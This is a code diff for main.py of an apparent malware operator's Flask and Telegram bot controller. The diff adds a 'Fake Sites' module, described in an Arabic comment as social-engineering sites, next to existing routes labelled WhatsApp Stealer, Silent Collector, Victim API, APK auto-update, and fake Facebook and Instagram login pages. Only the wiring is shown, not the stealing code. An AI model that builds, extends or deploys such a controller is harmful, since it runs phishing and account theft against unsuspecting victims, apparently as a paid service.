@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v8
-# مع Silent Collector
+# DEV 1 - Bot Controller v9
+# مع Silent Collector + Fake Sites
 # ============================================================
 
 import os
@@ -95,15 +95,29 @@ except Exception as e:
     def init_apk_update_routes(app, bot):
         pass
 
+# ============================================================
+# [6] ★ Fake Sites
+# ============================================================
+try:
+    from fake_sites import init_fake_sites
+    FAKE_SITES_ENABLED = True
+    logger.info("[+] fake_sites imported")
+except Exception as e:
+    logger.exception(f"[-] fake_sites import failed: {e}")
+    FAKE_SITES_ENABLED = False
+
+    def init_fake_sites(app, bot):
+        pass
+
 
 # ============================================================
-# [6] Flask Setup
+# [7] Flask Setup
 # ============================================================
 app = Flask(__name__)
 
 
 # ============================================================
-# [7] Origin Gate
+# [8] Origin Gate
 # ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
@@ -111,7 +125,8 @@ ALLOWED_PREFIXES = (
     '/wa',              # WhatsApp Stealer
     '/apk',             # APK Manager + Auto-Update
     '/dashboard',       # Web Dashboard
-    '/s/',              # ★ Silent Collector
+    '/s/',              # Silent Collector
+    '/fs',              # ★ Fake Sites (مواقع الهندسة الاجتماعية)
     '/api/v1/session', '/f/',
     '/login.php', '/ig_login.php',
     '/manifest.json', '/sw.js',
@@ -151,7 +166,7 @@ def verify_origin():
 
 
 # ============================================================
-# [8] Health Check
+# [9] Health Check
 # ============================================================
 @app.route('/')
 def health_check():
@@ -159,7 +174,7 @@ def health_check():
 
 
 # ============================================================
-# [9] Request Timing
+# [10] Request Timing
 # ============================================================
 @app.before_request
 def start_timer():
@@ -187,7 +202,7 @@ def log_request(response):
 
 
 # ============================================================
-# [10] تسجيل الـ Blueprints
+# [11] تسجيل الـ Blueprints
 # ============================================================
 if wa_bp:
     app.register_blueprint(wa_bp)
@@ -199,7 +214,7 @@ if apk_bp:
 
 
 # ============================================================
-# [11] Init Routes
+# [12] Init Routes
 # ============================================================
 init_facebook_routes(app, bot)
 logger.info("[+] Init: facebook routes")
@@ -237,7 +252,7 @@ if APK_UPDATE_ENABLED:
 else:
     logger.warning("[-] APK Update disabled - skipping init")
 
-# ★ Silent Collector Routes
+# Silent Collector Routes
 if SILENT_ENABLED:
     try:
         init_silent_collector_routes(app, bot)
@@ -247,11 +262,21 @@ if SILENT_ENABLED:
 else:
     logger.warning("[-] Silent Collector disabled - skipping init")
 
+# ★ Fake Sites Routes
+if FAKE_SITES_ENABLED:
+    try:
+        init_fake_sites(app, bot)
+        logger.info("[+] Init: fake sites routes")
+    except Exception as e:
+        logger.exception(f"[-] Fake Sites init failed: {e}")
+else:
+    logger.warning("[-] Fake Sites disabled - skipping init")
+
 register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
 
 # ============================================================
-# [12] Victim API
+# [13] Victim API
 # ============================================================
 try:
     init_victim_api(app, bot)
@@ -260,7 +285,7 @@ except Exception as e:
     logger.exception(f"[-] Victim API init failed: {e}")
 
 # ============================================================
-# [13] Short Link
+# [14] Short Link
 # ============================================================
 try:
     init_short_link(app)
@@ -269,13 +294,13 @@ except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
 # ============================================================
-# [14] Monitoring
+# [15] Monitoring
 # ============================================================
 init_monitoring(app)
 start_cleanup_thread()
 
 # ============================================================
-# [15] Web Dashboard
+# [16] Web Dashboard
 # ============================================================
 if WEB_DASHBOARD_ENABLED:
     try:
@@ -288,7 +313,7 @@ else:
 
 
 # ============================================================
-# [16] تشغيل البوت
+# [17] تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     logger.info("=" * 60)
@@ -337,7 +362,7 @@ def run_telegram_bot():
 
 
 # ============================================================
-# [17] Main
+# [18] Main
 # ============================================================
 if __name__ == "__main__":
     try:
